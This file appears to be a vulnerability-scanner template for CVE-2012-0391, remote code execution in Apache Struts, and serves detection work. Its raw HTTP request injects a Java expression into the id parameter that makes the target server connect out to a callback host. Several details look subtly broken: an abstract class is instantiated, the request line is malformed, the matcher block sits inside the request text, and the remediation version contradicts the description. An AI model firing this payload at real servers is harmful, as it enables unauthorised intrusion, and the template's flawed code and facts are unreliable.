id: CVE-2012-0391

info:
  name: Apache Struts - Remote Command Execution
  author: king-alexander
  severity: high
  description: |
    The ExceptionDelegator component in Apache Struts before 2.2.3.1 permits remote command execution via a crafted parameter value.
  impact: |
    A user who can trigger the exception handling logic can also execute aribtrary Java code and operating system commands.
  remediation: |
    Update to Struts 2.3.18 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2012-0391
    - https://www.exploit-db.com/exploits/18329
  tags: apache,cve,cve2012,kev,rce

http:
  - raw:
      - |
        GET /Test.action?id='%2b(new+java.net.URLConnection(new+java.net.URL("https://{{interactsh-url}}").openConnection()).connect())%2b' HTTP 1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        matchers:
          - type: word
            part: interactsh_protocol
            words:
              - "http"
